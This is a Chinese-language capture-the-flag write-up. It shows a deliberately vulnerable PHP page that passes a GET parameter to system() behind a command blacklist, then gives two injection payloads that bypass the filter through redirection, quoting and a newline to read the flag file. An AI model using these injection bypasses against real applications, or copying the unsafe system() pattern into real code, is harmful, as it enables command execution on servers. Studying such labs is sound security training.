```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:32:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

分析源码

过滤了

;

cat

flag

空格

数字

$

*

more

less

head

sort

tail

sed

cut

awk

strings

od

curl

`

%

\x09即水平制表符tab

\x26即&符号



无回显



### 第一种

利用<>绕过空格

利用||绕过无回显

利用''绕过字母过滤

```
?c=ls||
```

![image-20250403155232393](./assets/image-20250403155232393.png)

```
?c=tac<>fl''ag.php||
```

![image-20250403155220644](./assets/image-20250403155220644.png)







### 第二种

利用<绕过空格

利用%0a绕过无回显

利用\绕过字母过滤

```
?c=tac<fl\ag.php%0a
```

![image-20250403155333881](./assets/image-20250403155333881.png)